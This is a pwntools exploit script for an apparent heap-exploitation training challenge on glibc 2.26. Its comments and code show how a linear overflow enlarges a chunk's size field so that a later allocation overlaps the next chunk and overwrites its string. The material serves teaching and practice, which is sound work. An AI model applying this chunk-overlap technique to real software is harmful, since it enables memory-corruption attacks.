'''
Overlapping chunks Challenge 2.26 Starting
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../../libc_versions/2.26/libc-2.26.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = './.overlap-2.26' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env, aslr=False)
	gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.26/ 
''') 

else: 
	p = process(elf.path, env=env) 

'''
Our main goal is to overwrite the string in the 'third' chunk. 
We can do this by overlapping a chunk with this string to change
the value in a later write. 

Our heap structure looks like the following after the first 
three allocations (first, second, third): 

===============================
---- first -------
prev_size (0x0)
size (0x40) 
Chunk Data (0x30 in length)
---- second ------
prev_size (0x0) 
size (0x100) 
Chunk Data (0xf0 in length)
---- third -------
prev_size (0x0) 
size (0x50) 
Chunk data (0x30 in length)  <---- Target string
===========================

There is a linear buffer overflow in the 'first' 
chunk that allows for a write into the 'second' chunk. 
Using this, we can overwrite the size of the 'second' chunk
in order to *enlarge* the chunk to encapsulate the 'third'
chunk as well. 

Using the vulnerability, we will overwrite the size of
the chunk of 'second' to overlap with 'third'. Then, when 
we *free* 'second' and reallocate, the new chunk will be
over the top of 'third'! A visual is shown below: 

===============================
---- first -------
prev_size (0x0)
size (0x40) 
Chunk Data (0x30) 
---- second ---------------------------------------|
prev_size (0x0)                                    |
size (0x150 - was 0x100)                           |
Chunk Data (0xf0 in length)                        |
---- third -------                                 |
prev_size (0x0)                                    |
size (0x50)                                        |
Chunk data (0x40 in length)  <---- Target string   |
<--------------------------------------------------|
===========================

Now, 'second' overlaps 'third'. 
Later on, a request will be made to malloc for
a chunk of size 0x150. This is the reason we expand
the chunk to be this size, as this size is requested later
(meaning that the chunk will be used). 

With the overlapped chunk, we can now overwrite
the string within 'third'.
'''

'''
This overwrites the size of the 'second' chunk, which 
is then freed shortly thereafter.
The chunk itself is 0x40 bytes total and has 0x30 bytes for 
a data section. So, we will fill these bytes to start with,
then overwrite the SIZE of the next chunk. 

We use '0x150' exactly because a future allocation uses 
this size! Once that allocation is made, it will return 
our extended chunk over the top of the 'third' chunk. 
'''
fake_chunk = b"A" * 0x38 # The amount of filler bytes prior to chunk SIZE
fake_chunk += p64(0x150) # Fake chunk size
p.sendline(fake_chunk) 

'''
The original chunk size was 0x100, with 0xf0 being used for data. 
So, we first 0xf0 (data size) bytes. Then, we fill the 
size and prev_size with garbage. Finally, the next section of
data will overlap with the 'third' pointer, allowing us to change
the value of the string. 

=================================
---- second ---------------------------------------|
prev_size (0x0)                                    |
size (0x150 - was 0x100)                           |
Chunk Data (0xf0 in length)                        |
---- third ------- <---------- Overlaps HERE!      |
prev_size (0x0)                                    |
size (0x40)                                        |
Chunk data (0x30 in length)  <---- Target string   |
<--------------------------------------------------|
=================================

'''
fake_chunk = b"C" * 0x100 # TODO: String value to overwrite
fake_chunk += b"Steve Jobs" 
p.sendline(fake_chunk) 

p.interactive()
